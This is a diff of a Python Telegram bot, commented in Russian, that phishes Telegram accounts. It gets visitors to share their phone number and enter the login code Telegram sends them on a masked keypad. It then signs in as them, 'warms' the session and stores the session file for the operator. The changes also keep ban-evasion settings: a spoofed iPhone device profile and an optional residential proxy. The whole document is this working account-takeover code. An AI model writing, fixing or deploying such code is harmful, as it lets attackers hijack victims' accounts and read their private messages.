@@ -1,7 +1,6 @@
 import os
 import asyncio
 import logging
-from datetime import datetime
 
 from aiogram import Bot, Dispatcher, Router, F
 from aiogram.filters import Command, StateFilter
@@ -9,8 +8,13 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (
-    Message, InlineKeyboardMarkup, InlineKeyboardButton,
-    CallbackQuery, Contact, ReplyKeyboardMarkup, KeyboardButton,
+    Message,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    CallbackQuery,
+    Contact,
+    ReplyKeyboardMarkup,
+    KeyboardButton,
 )
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -25,20 +29,16 @@ from telethon.errors import (
     UserDeactivatedBanError,
 )
 
-# ================== ЗАЩИТА ОТ ЗАМОРОЗКИ ==================
-PROXY = None  # ← Вставь свой residential SOCKS5: (socks.SOCKS5, 'ip', port, True, 'user', 'pass')
-
-DEVICE_MODEL = "iPhone 16 Pro Max"
-SYSTEM_VERSION = "iOS 18.3"
-APP_VERSION = "11.8.0"
-LANG_CODE = "ru"
-SYSTEM_LANG_CODE = "ru-RU"
-# ========================================================
-
+# ────────────────────────────────────────────────
+# НАСТРОЙКИ
+# ────────────────────────────────────────────────
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(levelname)s | %(message)s",
-    handlers=[logging.StreamHandler(), logging.FileHandler("bot.log", encoding="utf-8")]
+    handlers=[
+        logging.StreamHandler(),
+        logging.FileHandler("bot.log", encoding="utf-8")
+    ]
 )
 logger = logging.getLogger(__name__)
 
@@ -50,32 +50,70 @@ ADMIN_IDS = {8559221549}
 SESSIONS_DIR = "sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
-bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+# Рекомендуемые параметры для снижения риска бана
+DEVICE_MODEL = "iPhone 16 Pro Max"
+SYSTEM_VERSION = "iOS 18.3"
+APP_VERSION = "11.8.0"
+LANG_CODE = "ru"
+SYSTEM_LANG_CODE = "ru-RU"
+
+# PROXY = (socks.SOCKS5, 'ip', port, True, 'user', 'pass')  # ← раскомментируй и заполни при необходимости
+
+bot = Bot(
+    token=BOT_TOKEN,
+    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
+)
+
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
 router = Router()
 dp.include_router(router)
 
 
+# ────────────────────────────────────────────────
+# СОСТОЯНИЯ
+# ────────────────────────────────────────────────
 class AddSession(StatesGroup):
     waiting_phone = State()
     waiting_code = State()
 
 
+# ────────────────────────────────────────────────
+# КЛАВИАТУРЫ
+# ────────────────────────────────────────────────
 def get_continue_keyboard() -> ReplyKeyboardMarkup:
     return ReplyKeyboardMarkup(
-        resize_keyboard=True, one_time_keyboard=True,
+        resize_keyboard=True,
+        one_time_keyboard=True,
         keyboard=[[KeyboardButton(text="Продолжить", request_contact=True)]]
     )
 
 
 def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
     rows = [
-        [InlineKeyboardButton(text="1", callback_data="code:1"), InlineKeyboardButton(text="2", callback_data="code:2"), InlineKeyboardButton(text="3", callback_data="code:3")],
-        [InlineKeyboardButton(text="4", callback_data="code:4"), InlineKeyboardButton(text="5", callback_data="code:5"), InlineKeyboardButton(text="6", callback_data="code:6")],
-        [InlineKeyboardButton(text="7", callback_data="code:7"), InlineKeyboardButton(text="8", callback_data="code:8"), InlineKeyboardButton(text="9", callback_data="code:9")],
-        [InlineKeyboardButton(text="0", callback_data="code:0"), InlineKeyboardButton(text="← стереть", callback_data="code:back"), InlineKeyboardButton(text="Отмена", callback_data="code:cancel")],
-        [InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm")],
+        [
+            InlineKeyboardButton(text="1", callback_data="code:1"),
+            InlineKeyboardButton(text="2", callback_data="code:2"),
+            InlineKeyboardButton(text="3", callback_data="code:3"),
+        ],
+        [
+            InlineKeyboardButton(text="4", callback_data="code:4"),
+            InlineKeyboardButton(text="5", callback_data="code:5"),
+            InlineKeyboardButton(text="6", callback_data="code:6"),
+        ],
+        [
+            InlineKeyboardButton(text="7", callback_data="code:7"),
+            InlineKeyboardButton(text="8", callback_data="code:8"),
+            InlineKeyboardButton(text="9", callback_data="code:9"),
+        ],
+        [
+            InlineKeyboardButton(text="0", callback_data="code:0"),
+            InlineKeyboardButton(text="← стереть", callback_data="code:back"),
+            InlineKeyboardButton(text="Отмена", callback_data="code:cancel"),
+        ],
+        [
+            InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm"),
+        ],
     ]
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
@@ -86,6 +124,9 @@ def mask_code(code: str) -> str:
     return "•" * (len(code) - 1) + code[-1]
 
 
+# ────────────────────────────────────────────────
+# /start
+# ────────────────────────────────────────────────
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     if message.from_user.id in ADMIN_IDS:
@@ -94,17 +135,23 @@ async def cmd_start(message: Message, state: FSMContext):
         return
 
     await message.answer(
-        "Нажми «Продолжить» для добавления сессии.",
+        "Нажми «Продолжить», чтобы добавить сессию.",
         reply_markup=get_continue_keyboard()
     )
     await state.set_state(AddSession.waiting_phone)
 
 
+# ────────────────────────────────────────────────
+# Получение номера → запрос кода
+# ────────────────────────────────────────────────
 @router.message(F.contact, StateFilter(AddSession.waiting_phone))
 async def process_phone(message: Message, state: FSMContext):
     contact = message.contact
-    phone = contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")
+    if not contact:
+        await message.reply("Поделись номером через кнопку.")
+        return
 
+    phone = contact.phone_number.replace("+", "").replace(" ", "").replace("-", "")
     if not phone.isdigit() or len(phone) < 9:
         await message.reply("Некорректный номер.")
         await state.clear()
@@ -119,17 +166,17 @@ async def process_phone(message: Message, state: FSMContext):
         app_version=APP_VERSION,
         lang_code=LANG_CODE,
         system_lang_code=SYSTEM_LANG_CODE,
-        proxy=PROXY
+        # proxy=PROXY,
     )
 
     try:
         await client.connect()
+
         if await client.is_user_authorized():
-            await message.reply("Уже авторизован.")
+            await message.reply("Этот номер уже авторизован здесь.")
             await state.clear()
             return
 
-        await asyncio.sleep(1.2)
         sent_code = await client.send_code_request(phone)
 
         msg = await message.reply(
@@ -141,130 +188,146 @@ async def process_phone(message: Message, state: FSMContext):
             phone=phone,
             session_path=session_path,
             phone_code_hash=sent_code.phone_code_hash,
-            client=client,                  # сохраняем живой клиент
             code_message_id=msg.message_id,
             current_code=""
         )
-        await state.set_state(AddSession.waiting_code)
 
+        await state.set_state(AddSession.waiting_code)
         logger.info(f"Код отправлен на +{phone}")
 
     except FloodWaitError as e:
-        await message.reply(f"Флуд. Подожди {e.seconds // 60 + 1} мин.")
-        await client.disconnect()
+        await message.reply(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
         await state.clear()
     except Exception as e:
-        logger.exception("Ошибка при send_code_request")
+        logger.exception(f"Ошибка при запросе кода +{phone}")
         await message.reply(f"Ошибка: {str(e)[:200]}")
-        await client.disconnect()
         await state.clear()
+    finally:
+        if await client.is_connected():
+            await client.disconnect()
 
 
+# ────────────────────────────────────────────────
+# Обработка кнопок кода
+# ────────────────────────────────────────────────
 @router.callback_query(StateFilter(AddSession.waiting_code))
 async def process_code_button(callback: CallbackQuery, state: FSMContext):
     data = await state.get_data()
     current_code = data.get("current_code", "")
     phone = data.get("phone")
-    client = data.get("client")
+    session_path = data.get("session_path")
+    phone_code_hash = data.get("phone_code_hash")
     code_msg_id = data.get("code_message_id")
+
+    if not phone_code_hash:
+        await callback.message.edit_text("Ошибка: hash кода потерян. Начни заново /start")
+        await state.clear()
+        await callback.answer()
+        return
 
     action = callback.data.split(":", 1)[1] if ":" in callback.data else ""
 
     if action.isdigit() and len(current_code) < 5:
         current_code += action
         await state.update_data(current_code=current_code)
+
     elif action == "back" and current_code:
         current_code = current_code[:-1]
         await state.update_data(current_code=current_code)
+
     elif action == "cancel":
-        if client and await client.is_connected():
-            await client.disconnect()
         await state.clear()
         await callback.message.edit_text("Авторизация отменена.")
         await callback.answer()
         return
+
     elif action == "confirm":
         if len(current_code) != 5:
             await callback.answer("Нужно ровно 5 цифр", show_alert=True)
             return
 
-        if not client or not await client.is_connected():
-            client = TelegramClient(
-                data.get("session_path"), API_ID, API_HASH,
-                device_model=DEVICE_MODEL,
-                system_version=SYSTEM_VERSION,
-                app_version=APP_VERSION,
-                lang_code=LANG_CODE,
-                system_lang_code=SYSTEM_LANG_CODE,
-                proxy=PROXY
-            )
-            await client.connect()
+        client = TelegramClient(
+            session_path, API_ID, API_HASH,
+            device_model=DEVICE_MODEL,
+            system_version=SYSTEM_VERSION,
+            app_version=APP_VERSION,
+            lang_code=LANG_CODE,
+            system_lang_code=SYSTEM_LANG_CODE,
+            # proxy=PROXY,
+        )
 
         try:
-            await asyncio.sleep(1.8)
+            await client.connect()
+            await asyncio.sleep(1.2)
 
-            logger.info(f"sign_in +{phone} код {current_code}")
+            logger.info(f"Попытка sign_in +{phone} код {current_code}")
 
             await client.sign_in(
                 phone=phone,
                 code=current_code,
-                phone_code_hash=data.get("phone_code_hash")
+                phone_code_hash=phone_code_hash
             )
 
-            # Прогрев сессии (важно!)
+            # Прогрев сессии
             await asyncio.sleep(2.5)
-            await client.send_message("me", "Сессия добавлена через бота. Всё работает ✅")
-            await asyncio.sleep(1.5)
+            await client.send_message("me", "Сессия успешно добавлена через бота ✅")
+            await asyncio.sleep(1.8)
 
             me = await client.get_me()
-            logger.info(f"УСПЕШНО → {me.first_name} (@{me.username or 'нет'}) id={me.id}")
+            logger.info(f"УСПЕШНЫЙ ВХОД → {me.first_name} (@{me.username or 'нет'}) id={me.id}")
+
+            session_size = os.path.getsize(session_path) if os.path.exists(session_path) else 0
+            logger.info(f"Сессия сохранена, размер: {session_size} байт")
 
             await callback.message.edit_text(
                 f"Готово! +{phone} авторизован и прогрет.\n"
-                "Сессия сохранена. Можешь закрыть чат."
+                "Сессия сохранена. Можешь удалить это сообщение."
             )
-
             await state.clear()
-
-            # НЕ disconnect здесь — сессия остаётся живой
 
         except PhoneCodeInvalidError:
             await callback.answer("Неверный код", show_alert=True)
             await state.update_data(current_code="")
-            await bot.edit_message_text(
-                chat_id=callback.message.chat.id,
-                message_id=code_msg_id,
-                text=f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код (неверный):",
-                reply_markup=get_code_keyboard("")
-            )
+            if code_msg_id:
+                await bot.edit_message_text(
+                    chat_id=callback.message.chat.id,
+                    message_id=code_msg_id,
+                    text=f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код (неверный):",
+                    reply_markup=get_code_keyboard("")
+                )
+
         except PhoneCodeExpiredError:
-            await callback.message.edit_text("Код устарел. Запроси новый через /start.")
+            await callback.message.edit_text("Код устарел. Нажми /start заново.")
             await state.clear()
+
         except SessionPasswordNeededError:
-            await callback.message.edit_text("Включена 2FA — пока не поддерживается.")
+            await callback.message.edit_text("Включена 2FA. Пока не поддерживается.")
             await state.clear()
+
         except FloodWaitError as e:
             await callback.message.edit_text(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
             await state.clear()
+
         except (AuthKeyUnregisteredError, UserDeactivatedBanError):
-            await callback.message.edit_text("Аккаунт заморожен Telegram. Напиши @SpamBot.")
+            await callback.message.edit_text("Аккаунт заморожен. Напиши @SpamBot.")
             await state.clear()
+
         except Exception as e:
-            logger.exception("Ошибка sign_in")
-            await callback.message.edit_text(f"Ошибка авторизации: {str(e)[:200]}")
+            logger.exception(f"Ошибка sign_in +{phone}")
+            await callback.message.edit_text(f"Ошибка: {str(e)[:200]}")
             await state.clear()
+
         finally:
-            # disconnect только при ошибке или отмене
-            if 'client' in locals() and await client.is_connected():
-                if not await state.get_state():  # если состояние очищено — ошибка
-                    await client.disconnect()
+            if await client.is_connected():
+                await client.disconnect()
 
         await callback.answer()
         return
 
-    # Обновление отображаемого кода
-    display = mask_code(current_code)
-    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display}</b>"
+    # Обновляем сообщение с кодом
+    display_code = mask_code(current_code)
+    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display_code}</b>"
+
     if code_msg_id:
         try:
             await bot.edit_message_text(
@@ -273,14 +336,17 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
                 text=text,
                 reply_markup=get_code_keyboard(current_code)
             )
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"Не удалось обновить сообщение: {e}")
 
     await callback.answer()
 
 
+# ────────────────────────────────────────────────
+# Запуск
+# ────────────────────────────────────────────────
 async def main():
-    logger.info("Бот запущен — без disconnect после успешного входа")
+    logger.info("Бот запущен — phone_code_hash передаётся явно")
     await dp.start_polling(bot)
 
 
